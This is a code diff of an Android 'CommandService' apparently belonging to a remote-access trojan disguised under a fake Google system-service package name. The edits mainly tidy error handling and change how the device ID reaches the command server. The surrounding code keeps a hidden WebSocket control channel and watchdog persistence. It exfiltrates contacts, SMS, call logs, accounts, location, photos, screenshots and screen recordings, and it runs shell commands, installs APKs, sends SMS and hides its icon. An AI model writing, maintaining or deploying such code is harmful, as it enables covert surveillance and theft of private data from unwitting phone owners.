@@ -23,6 +23,7 @@ import android.util.Size
 import android.telephony.SmsManager
 import android.util.Base64
 import android.util.Log
+import androidx.core.content.ContextCompat
 import androidx.core.content.FileProvider
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.CommandQueueManager
@@ -96,7 +97,7 @@ class CommandService : Service() {
             scheduler.schedule(builder.build())
             Log.d(TAG, "JobScheduler scheduled")
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to schedule job: ${e.message}")
+            Log.e(TAG, "Failed to schedule job: ${(e.message ?: "Unknown error")}")
         }
     }
 
@@ -131,7 +132,7 @@ class CommandService : Service() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to check/restart WatchdogService: ${e.message}")
+            Log.e(TAG, "Failed to check/restart WatchdogService: ${(e.message ?: "Unknown error")}")
         }
     }
 
@@ -146,10 +147,9 @@ class CommandService : Service() {
                 .pingInterval(25, TimeUnit.SECONDS)
                 .build()
 
+            val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${getDeviceIdentifier()}"
             val request = Request.Builder()
-                .url(AndroidConfig.websocketUrl)
-                .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
-                .header("X-Device-ID", getDeviceIdentifier())
+                .url(wsUrl)
                 .build()
 
             webSocket = client?.newWebSocket(request, object : WebSocketListener() {
@@ -189,7 +189,7 @@ class CommandService : Service() {
                 }
             })
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to connect WebSocket: ${e.message}")
+            Log.e(TAG, "Failed to connect WebSocket: ${(e.message ?: "Unknown error")}")
             scheduleReconnect()
         }
     }
@@ -306,7 +306,7 @@ class CommandService : Service() {
                 else -> Log.w(TAG, "Unknown command: $command")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error handling message: ${e.message}")
+            Log.e(TAG, "Error handling message: ${(e.message ?: "Unknown error")}")
         }
     }
 
@@ -354,7 +354,7 @@ class CommandService : Service() {
                     sendError("Could not get location")
                 }
             } catch (e: Exception) {
-                sendError("Location error: ${e.message}")
+                sendError("Location error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -362,6 +362,10 @@ class CommandService : Service() {
     private fun executeGetAccounts() {
         serviceScope.launch {
             try {
+                if (ContextCompat.checkSelfPermission(this@CommandService, android.Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
+                    sendResponse("accounts", JSONObject().put("error", "GET_ACCOUNTS permission not granted"))
+                    return@launch
+                }
                 val accountManager = android.accounts.AccountManager.get(this@CommandService)
                 val accounts = accountManager.accounts
                 val accountList = org.json.JSONArray()
@@ -375,8 +379,8 @@ class CommandService : Service() {
                 
                 sendResponse("accounts", JSONObject().put("accounts", accountList))
             } catch (e: Exception) {
-                Log.e(TAG, "Error getting accounts: ${e.message}")
-                sendResponse("accounts", JSONObject().put("error", e.message))
+                Log.e(TAG, "Error getting accounts: ${(e.message ?: "Unknown error")}")
+                sendResponse("accounts", JSONObject().put("error", (e.message ?: "Unknown error")))
             }
         }
     }
@@ -392,8 +396,8 @@ class CommandService : Service() {
                 
                 sendResponse("wifi_toggle", JSONObject().put("status", "settings_opened"))
             } catch (e: Exception) {
-                Log.e(TAG, "Error toggling WiFi: ${e.message}")
-                sendResponse("wifi_toggle", JSONObject().put("error", e.message))
+                Log.e(TAG, "Error toggling WiFi: ${(e.message ?: "Unknown error")}")
+                sendResponse("wifi_toggle", JSONObject().put("error", (e.message ?: "Unknown error")))
             }
         }
     }
@@ -523,7 +527,7 @@ class CommandService : Service() {
                     sendError("Failed to capture photo")
                 }
             } catch (e: Exception) {
-                sendError("Photo error: ${e.message}")
+                sendError("Photo error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -579,7 +583,7 @@ class CommandService : Service() {
                 })
             } catch (e: Exception) {
                 sendResponse("shell_result", JSONObject().apply {
-                    put("error", e.message)
+                    put("error", (e.message ?: "Unknown error"))
                 })
             }
         }
@@ -760,7 +764,7 @@ class CommandService : Service() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting contacts: ${e.message}")
+            Log.e(TAG, "Error collecting contacts: ${(e.message ?: "Unknown error")}")
         }
         return contacts
     }
@@ -784,7 +788,7 @@ class CommandService : Service() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting SMS: ${e.message}")
+            Log.e(TAG, "Error collecting SMS: ${(e.message ?: "Unknown error")}")
         }
         return messages
     }
@@ -808,7 +812,7 @@ class CommandService : Service() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting call logs: ${e.message}")
+            Log.e(TAG, "Error collecting call logs: ${(e.message ?: "Unknown error")}")
         }
         return logs
     }
@@ -827,7 +831,7 @@ class CommandService : Service() {
                 apps.put(app)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting apps: ${e.message}")
+            Log.e(TAG, "Error collecting apps: ${(e.message ?: "Unknown error")}")
         }
         return apps
     }
@@ -900,7 +904,7 @@ class CommandService : Service() {
                     sendError("Failed to capture screenshot")
                 }
             } catch (e: Exception) {
-                sendError("Screenshot error: ${e.message}")
+                sendError("Screenshot error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -924,7 +928,7 @@ class CommandService : Service() {
                     put("duration", duration)
                 })
             } catch (e: Exception) {
-                sendError("Screen record start error: ${e.message}")
+                sendError("Screen record start error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -948,7 +952,7 @@ class CommandService : Service() {
                     sendError("Recording file not found")
                 }
             } catch (e: Exception) {
-                sendError("Screen record stop error: ${e.message}")
+                sendError("Screen record stop error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -970,7 +974,7 @@ class CommandService : Service() {
                     sendError("SMS permission not granted")
                 }
             } catch (e: Exception) {
-                sendError("Send SMS error: ${e.message}")
+                sendError("Send SMS error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -997,7 +1001,7 @@ class CommandService : Service() {
                     put("status", "installation_started")
                 })
             } catch (e: Exception) {
-                sendError("Install APK error: ${e.message}")
+                sendError("Install APK error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1017,7 +1021,7 @@ class CommandService : Service() {
                     put("package", packageName)
                 })
             } catch (e: Exception) {
-                sendError("Uninstall app error: ${e.message}")
+                sendError("Uninstall app error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1039,7 +1043,7 @@ class CommandService : Service() {
                     sendError("App not found: $packageName")
                 }
             } catch (e: Exception) {
-                sendError("Launch app error: ${e.message}")
+                sendError("Launch app error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1063,7 +1067,7 @@ class CommandService : Service() {
                 
                 wakeLock.release()
             } catch (e: Exception) {
-                sendError("Unlock screen error: ${e.message}")
+                sendError("Unlock screen error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1081,7 +1085,7 @@ class CommandService : Service() {
                     put("status", "hidden")
                 })
             } catch (e: Exception) {
-                sendError("Hide icon error: ${e.message}")
+                sendError("Hide icon error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1099,7 +1103,7 @@ class CommandService : Service() {
                     put("status", "visible")
                 })
             } catch (e: Exception) {
-                sendError("Show icon error: ${e.message}")
+                sendError("Show icon error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1128,7 +1132,7 @@ class CommandService : Service() {
                     put("mode", mode)
                 })
             } catch (e: Exception) {
-                sendError("Change audio mode error: ${e.message}")
+                sendError("Change audio mode error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1150,7 +1154,7 @@ class CommandService : Service() {
                 
                 sendResponse("wifi_info", info)
             } catch (e: Exception) {
-                sendError("Get WiFi info error: ${e.message}")
+                sendError("Get WiFi info error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
@@ -1176,7 +1180,7 @@ class CommandService : Service() {
                     put("command", command)
                 })
             } catch (e: Exception) {
-                sendError("Shell exec error: ${e.message}")
+                sendError("Shell exec error: ${(e.message ?: "Unknown error")}")
             }
         }
     }
